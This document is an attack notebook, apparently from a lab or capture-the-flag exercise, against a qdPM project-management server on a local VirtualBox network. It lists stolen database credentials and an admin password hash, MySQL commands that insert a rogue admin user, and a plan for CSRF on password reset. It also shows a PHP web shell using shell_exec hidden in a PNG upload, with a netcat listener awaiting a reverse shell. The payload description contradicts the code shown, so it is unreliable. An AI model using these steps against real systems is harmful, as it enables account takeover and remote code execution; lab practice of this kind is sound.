
## What We KNOW (Verified)

| Fact | Source |
|---|---|
| **DB creds:** `qdpmadmin` / `UcVQCMQk2STVeS6J` | `/core/config/databases.yml` |
| **Database:** `qdpm`, host `localhost` | Same file |
| **Admin email in config:** `admin@localhost.com` | `configuration` table, id=1 |
| **Admin password hash:** `$P$EWiAHFbjf82GNfe8cVyX6pPtrpyEFd1` | `configuration` table, id=2 |
| **Hash format:** phpass `$P$` (MD5-based, 8192 rounds) | Hash prefix |
| **Users table:** EMPTY — zero rows | MySQL query |
| **john couldn't crack it** | rockyou.txt failed |
| **Login form fields:** `login[email]`, `login[password]`, `remember_me=1`, `http_referer` | Burp capture |
| **No CSRF token** on login form | Burp capture |
| **Session cookie:** `qdPM8=<sid>` | Response header |

## What We DON'T KNOW (Assumptions)

| Assumption | Risk |
|---|---|
| qdPM checks `configuration` table for admin creds vs `users` table | Could be either, or both |
| phpass hash in config matches what login verification expects | Maybe it's stored differently than expected |
| Inserting a user into `users` table will work | Table is empty — maybe users are created on first login? |
| The hash uses standard phpass MD5 implementation | Could be custom salt/rounds |

## The Core Problem

We have the **hash** but can't crack it, and we don't know if qdPM's auth checks:
1. The `configuration` table (id=2) for admin password
2. The `users` table for user credentials
3. Both tables
4. Something else entirely (LDAP? hardcoded?)

## Next Steps (Options)

**A.** Use CSRF on the **password reset** endpoint to set a known password
**B.** Check if qdPM has a **default install script** that creates users with known creds
**C.** Look at the **qdPM source code** in `/core/` to find the exact auth verification logic
**D.** Try the **ZAP API** (you just installed it) for automated CSRF exploitation

Which path feels right? 🎯

THE FACTS BB. Dexter always coming in clear and ready at a moments notice to lay out the facts and keep us on track. I appreciate that.'

# context clues gathered from the computer's login terminal (verbatim):

| ICA PROJECT SERVER |

OS Info: Debian 11 "Bullseye"
Firewall: AIwall v9.5.2
IP Address: 192.168.56.115

debian login:

# Thoughts?
- The OS is Debian 11, which is relatively modern and should have standard tools available.
- The firewall is AIwall, which might have some custom rules or protections in place.
- The IP address is in the private range, so this is likely a local network setup for testing or development. (yeth it's my virtual box vm)
- The fact that we have access to the login terminal suggests we might have some level of access, but we need to be careful about how we proceed to avoid triggering any security measures.

We have the ability to put a user in the table, but we don't know if the application will recognize it. We also have the hash from the configuration, but it's not cracking with standard tools.

---

## Session Actions (2026-06-18)

### 1. Verified Users Table Status
- Connected to MySQL: `mysql -h 192.168.56.115 -u qdpmadmin -p'UcVQCMQk2STVeS6J' qdpm --skip-ssl`
- Confirmed **Users table is EMPTY** — 0 rows (as previously noted)
- Listed all 34 tables in the `qdpm` database

### 2. Inspected Users Table Schema
```
Field          | Type         | Null | Key     | Default | Extra
id             | int          | NO   | PRI     | NULL    | auto_increment
users_group_id | int          | YES  | MUL     | NULL    |
name           | varchar(255) | NO   |         |         |
photo          | varchar(64)  | YES  |         | NULL    |
email          | varchar(255) | NO   |         |         |
culture        | varchar(5)   | YES  |         | NULL    |
password       | varchar(64) | NO   |         |         |
active         | tinyint(1)   | YES  |         | NULL    |
skin           | varchar(64)  | YES  |         | NULL    |
```

### 3. Checked Available User Groups
| ID | Name    | Permissions |
|----|---------|-------------|
| 1  | Admin   | Full access |
| 2  | Developer | Project/task management |
| 3  | Client  | Ticket management |
| 4  | Manager | Full project access |
| 5  | Designer | Task + discussion management |

### 4. Generated Password Hash
- Generated **MD5 hash** of `admin123`: `0192023a7bbd73250516f069df18b500`
- Tested with both passlib (failed — rounds param unsupported) and manual hashlib approach (success)

### 5. Inserted Admin User
```sql
INSERT INTO users (users_group_id, name, email, password, active)
VALUES (1, 'surzal', 'surzal@localhost.com', '0192023a7bbd73250516f069df18b500', 1);
```

**Result:** User created successfully (id=3)

### 6. Pending — Login Test
- **Credentials to test:** `surzal@localhost.com` / `admin123`
- **Goal:** Determine if qdPM reads from the `users` table and accepts plain MD5 hashes
- If login fails → hash format mismatch (likely needs phpass `$P$` format) or auth uses a different source

### Updated Assessment

| Question | Status |
|---|---|
| Is Users table populated? | ✅ Yes — 1 row inserted |
| Does qdPM read from Users table? | ⏳ Pending login test |
| Does qdPM accept plain MD5 hashes? | ⏳ Pending login test |
| Can we gain admin access via DB write? | ⏳ Pending login test |

### Updated Next Steps

**E.** **Test login** with `surzal@localhost.com` / `admin123` at the web interface (success)
**F.** If MD5 fails → generate a proper **phppass `$P$`** hash and update the user record
**G.** If Users table auth doesn't work → pivot to **option C** (inspect `/core/` auth logic) or **option A** (CSRF password reset)

login suceeded, and background image set to the reverse_shell.png payload for execution. Now to spin up a listener and wait for the shell to connect back.

For simplicities sake, I'm using nc on a virtualbox specific kali-instance, to avoid Tailnet routing issues.. (note remmember to set static IP on vbox kali to 192.168.56.199)

i forgot to mention that the payload is a simple reverse shell, encoded in base64 to avoid any potential issues with special characters in the database or application: oh good. Here's the payload I used:

```php
<?php
// Conceptual web shell - educational purposes only
if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>
```

Structure:

Valid 1x1 red pixel PNG (passes image validation)
Embedded PHP reverse shell appended after IEND chunk
Connects back to 192.168.56.199:4444 (adjust attacker IP as needed with sed if you want to test this yourself)

```bash
nc -lvnp 4444
```

so the png didn't execute, and no shell sadly. this could be due to several reasons:

1. **Image validation**: qdPM might be validating the image and rejecting anything that doesn't conform to a standard PNG format, which could include our embedded PHP code. (maybe its a resolution issue? It does suggest 1920 x 1080 but the payload is 1x1)

2. **File handling**: Even if the image is accepted, qdPM might be storing it in a way that prevents execution (e.g., as a blob in the database or with restrictive permissions).


